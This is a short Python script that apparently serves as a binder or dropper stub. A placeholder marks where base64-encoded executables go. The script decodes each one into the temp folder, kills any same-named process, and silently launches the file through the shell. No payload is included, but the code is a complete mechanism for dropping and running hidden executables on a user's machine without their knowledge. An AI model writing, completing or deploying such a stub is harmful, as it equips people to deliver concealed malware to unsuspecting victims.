from subprocess import Popen
import tempfile
import base64
import psutil


def kill_process(process_name):
    for process in psutil.process_iter():
        if process.name() == process_name:
            process.kill()


exes = []

#EXES-BINARY#

i = 0
temp_dir = tempfile.gettempdir()

for i in range(len(exes)):
    file_name = f'{temp_dir}\\f{i}.exe'
    kill_process(f'f{i}.exe')

    with open(file_name, 'wb') as file_:
        file_.write(base64.b64decode(exes[i]))
        Popen(['start', file_name], shell=True)
